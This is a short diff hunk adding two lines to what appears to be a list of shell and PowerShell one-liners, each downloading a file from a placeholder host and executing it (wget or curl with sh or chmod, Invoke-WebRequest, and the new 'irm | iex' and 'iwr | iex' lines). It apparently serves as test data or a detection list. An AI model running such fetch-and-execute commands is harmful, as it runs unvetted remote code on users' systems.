@@ -8,3 +8,5 @@ wget -q https://example.invalid/b.sh -O /tmp/b.sh && sh /tmp/b.sh
 Invoke-WebRequest https://example.invalid/c.ps1 -OutFile c.ps1; pwsh c.ps1
 curl https://example.invalid/d -o d && chmod +x d && ./d
 wget https://example.invalid/e && chmod +x e && ./e
+irm https://example.invalid/f.ps1 | iex
+iwr https://example.invalid/g.ps1 | iex
